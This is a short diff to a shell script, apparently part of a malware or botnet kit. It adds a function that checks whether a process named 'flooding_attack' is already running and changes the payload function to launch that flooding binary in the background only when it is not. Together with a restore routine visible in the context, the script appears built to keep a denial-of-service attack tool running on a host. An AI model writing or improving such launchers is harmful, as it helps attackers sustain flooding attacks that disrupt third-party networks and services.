@@ -18,8 +18,18 @@ check_and_restore() {
   fi
 }
 
+is_process_exist() {
+  local process_name="flooding_attack"
+  ps -e | grep -q "$process_name"
+}
+
 payload() {
-  $home_dir/$dir01/flooding_attack
+  is_process_exist
+  if [ $? -eq 0 ]; then # positive match
+    echo "Attack already launched!"
+  else
+    $home_dir/$dir01/flooding_attack&
+  fi
 }
 
 main() {
